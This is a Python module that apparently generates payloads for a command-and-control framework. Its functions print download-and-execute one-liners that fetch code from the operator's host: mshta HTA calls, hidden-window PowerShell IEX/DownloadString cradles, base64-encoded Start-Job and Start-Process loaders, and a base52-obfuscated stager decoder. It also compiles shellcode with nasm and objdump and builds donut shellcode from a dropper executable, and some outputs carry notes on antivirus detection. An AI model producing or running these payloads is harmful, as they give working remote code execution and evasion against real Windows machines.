
from core.config import *
from core import config
from core.color import bcolors
import base64
def hta_paylods():
    if SSL==True:
        print (bcolors.OKBLUE + '(LOW):' + bcolors.ENDC)
        print ('mshta https://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
        print ('powershell -c \"mshta https://%s:%s%s\"' % (config.HOST, config.PORT,config.hta_payload))
        config.PAYLOADS.append('\nmshta https://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
        print('')
    else:
        print(bcolors.OKBLUE + '(LOW):' + bcolors.ENDC)
        print('mshta http://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
        print('powershell -c \"mshta http://%s:%s%s\"' % (config.HOST, config.PORT,config.hta_payload))
        config.PAYLOADS.append('\nmshta http://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
        print('')

def pwsh_job():
    commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))}"
    commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')))" -WindowStyle Hidden'
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{HTTP}://{ip}:{port}{raw}');IEX($s)"
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","http")

    payload = base64.b64encode(bytearray(payload,"UTF-8"))
    print ('---+Powershell JOB Payload+---\n' + commandJ.replace('{payload}', payload.decode("UTF-8")))
    print ('')
    print ('---+Powershell New Process Payload+---\n' + commandP.replace('{payload}', payload.decode("UTF-8")))
    print ('')
    config.PAYLOADS.append(commandJ.replace('{payload}', payload.decode("UTF-8")))
    config.PAYLOADS.append(commandP.replace('{payload}', payload.decode("UTF-8")))



def pwsh_file():
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))"
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{HTTP}://{ip}:{port}{hjf}');IEX($s)"
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjf}",hjf_payload).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjf}",hjf_payload).replace("{HTTP}","http")
    payload = base64.b64encode(bytearray(payload,"UTF-8"))
    print ('---+Powershell JOB + File Payload+--- ( Detected by AVs)')
    print (commandF.replace('{payload}', payload.decode("UTF-8")))
    print ('')
    config.PAYLOADS.append(commandF.replace('{payload}', payload.decode("UTF-8")))

def pwsh_sct():
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))"
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{HTTP}://{ip}:{port}{hjfs}');IEX($s)"
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjfs}",hjfs_payload).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjfs}",hjfs_payload).replace("{HTTP}","http")
    payload = base64.b64encode(bytearray(payload,"UTF-8"))
    print ('---+Powershell JOB + File +SCT Payload+--- ( Detected by AVs)')
    print (commandF.replace('{payload}', payload.decode("UTF-8")))
    print ('')
    config.PAYLOADS.append(commandF.replace('{payload}', payload.decode("UTF-8")))

def simple_payloads():
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{raw}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{raw}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{raw}');\""""
    payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload)
    payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload)
    payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload)
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","https")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","https")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","http")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","http")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","http")
    print('---+ Powershell simple payloads +---')
    print( payload)
    print( payload2)
    print( payload3)
    print( '')
    config.PAYLOADS.append(payload)
    config.PAYLOADS.append(payload2)
    config.PAYLOADS.append(payload3)

def pwsh_base64():

    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b64stager}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b64stager}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b64stager}');\""""
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","https")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","https")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","http")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","http")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","http")
    print( '---+ Powershell base64 stager +---')
    print( payload)
    print( payload2)
    print( payload3)
    print( '')
    config.PAYLOADS.append('---+ Powershell base64 stager +---')
    config.PAYLOADS.append(payload)
    config.PAYLOADS.append(payload2)
    config.PAYLOADS.append(payload3)


def pwsh_base52():
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b52stager}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b52stager}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b52stager}');\""""
    payload4 = """powershell -w hidden $s=(new-object net.webclient).DownloadString('{HTTP}://{ip}:{port}{b52payload}');$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"""
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","https")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","https")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","https")
        payload4 = payload4.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52payload}",b52_payload).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","http")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","http")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","http")
        payload4 = payload4.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52payload}",b52_payload).replace("{HTTP}","http")
    print( '---+ Powershell base52 stager +---')
    print( payload)
    print( payload2)
    print( payload3)
    print( payload4)
    print( '')
    config.PAYLOADS.append('---+ Powershell base52 stager +---')
    config.PAYLOADS.append(payload)
    config.PAYLOADS.append(payload2)
    config.PAYLOADS.append(payload3)
    config.PAYLOADS.append(payload4)

def cmd_shellcodex64():
    f=open("agents/cmd_shellcodex64.ninja","r")
    payload=f.read()
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","http")

    out=open("payloads/cmd_shellcodex64.asm","w")
    out.write(payload)
    out.close()
    try:
        compile = "nasm -f win64 payloads/cmd_shellcodex64.asm -o payloads/cmd_shellcodex64.bin"
        shellcode = """for i in $(objdump -d payloads/cmd_shellcodex64.bin |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo"""
        os.system(compile)
        sc = os.popen(shellcode).read()

        print("---+  CMD Shellcode X64  ---+ !\n")
        print('assembly code and compiled binary writen to payloads\n' )
        print('unsigned char sc[] = "%s"; ' % sc.strip("\n") )
        config.PAYLOADS.append('unsigned char sc[] = "%s"; ' % sc.strip("\n") )
    except:
        print("Please check if nasm installed")


def cmd_shellcodex86():
    f=open("agents/cmd_shellcodex64.ninja","r")
    payload=f.read()
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","http")

    out=open("payloads/cmd_shellcodex86.asm","w")
    out.write(payload)
    out.close()
    try:
        compile_nasm_command = "nasm -f win64 payloads/cmd_shellcodex86.asm -o payloads/cmd_shellcodex86.bin"
        extract_shellcode_command = """for i in $(objdump -d payloads/cmd_shellcodex86.bin |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo"""
        os.system(compile_nasm_command)
        sc = os.popen(extract_shellcode_command).read()

        print("---+  CMD Shellcode X86 ---+ !\n")
        print('assembly code and compiled binary writen to payloads \n' )
        print('unsigned char sc[] = "%s"; ' % sc.strip("\n") )
        config.PAYLOADS.append('unsigned char sc[] = "%s"; ' % sc.strip("\n") )
    except:
        print("Please check if nasm installed")

def donut_shellcode():
    try:
        shellcode=donut.create(file="payloads/dropper_cs.exe")
    except:
        print("Make sure donut 0.9.2 installed : pip3 install 'donut-shellcode==0.9.2' ")
    b64=base64.b64encode(shellcode).decode("utf-8")
    out=open("payloads/donut_shellcode.b64","w")
    out.write(b64)
    out.close()
    print("---+  Donut Shellcode ---+ !\n")
    print('donut shellcode written to payloads/donut_shellcode.b64 \n' )
